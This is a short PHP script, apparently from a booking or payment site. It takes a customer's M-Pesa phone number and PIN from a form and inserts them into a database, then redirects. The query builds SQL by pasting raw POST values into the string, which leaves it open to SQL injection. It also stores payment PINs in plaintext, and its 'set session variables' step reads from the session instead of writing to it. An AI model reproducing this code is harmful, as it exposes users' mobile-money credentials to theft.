<?php
require('inc/dbcon.php');
$conn = connect();
session_start();

$mphone = isset($_POST['mphone']) ? $_POST['mphone'] : '';
$mpin = isset($_POST['mpin']) ? $_POST['mpin'] : '';

$name = $_SESSION["name"];

$sql = "INSERT INTO `mpesa`(`Cust_name`, `mphone`, `mpin`) VALUES ('$name','$mphone','$mpin')";
$result2 = mysqli_query($conn, $sql);
if ($result2) {

    // Set session variables
    $mphone = $_SESSION["mphone"];
    $mpin = $_SESSION["mpin"];
    header("location:dates.php");
}